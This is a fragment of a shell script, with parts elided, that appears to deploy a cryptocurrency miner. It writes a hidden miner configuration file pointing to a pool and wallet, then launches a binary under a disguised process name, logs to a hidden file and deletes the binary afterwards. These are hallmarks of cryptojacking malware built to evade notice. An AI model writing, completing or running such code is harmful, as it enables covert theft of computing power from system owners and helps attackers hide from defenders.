...
bld(){ mkdir -p "$MYDIR" 2>/dev/null;[ -f "$MYDIR/.c" ]||{ printf '{"autosave":true,"donate-level":0,"donate-over-proxy":0,"cpu":{"enabled":true,"huge-pages":true,"max-threads-hint":75},"opencl":false,"cuda":false,"pools":[{"url":"%s","user":"%s","pass":"%s","keepalive":true,"tls":true}]}\n' "$POOL" "$W" "$PW">"$MYDIR/.c" 2>/dev/null;chmod 600 "$MYDIR/.c" 2>/dev/null; }; }cfgchk(){ grep -q "\"url\":\"$POOL\"" "$MYDIR/.c" 2>/dev/null||{ printf '{"autosave":true,"donate-level":0,"donate-over-proxy":0,"cpu":{"enabled":true,"huge-pages":true,"max-threads-hint":75},"opencl":false,"cuda":false,"pools":[{"url":"%s","user":"%s","pass":"%s","keepalive":true,"tls":true}]}\n' "$POOL" "$W" "$PW">"$MYDIR/.c" 2>/dev/null;chmod 600 "$MYDIR/.c" 2>/dev/null; }; }
...
cd "$MYDIR"
FN="$(basename "$bin")"
bash -c 'exec -a "'"$FN"'" "$0" -c "$MYDIR/.c"' "$RB" >>"$MYDIR/.log" 2>&1
ec=$?
rm -f "$RB" 2>/dev/null
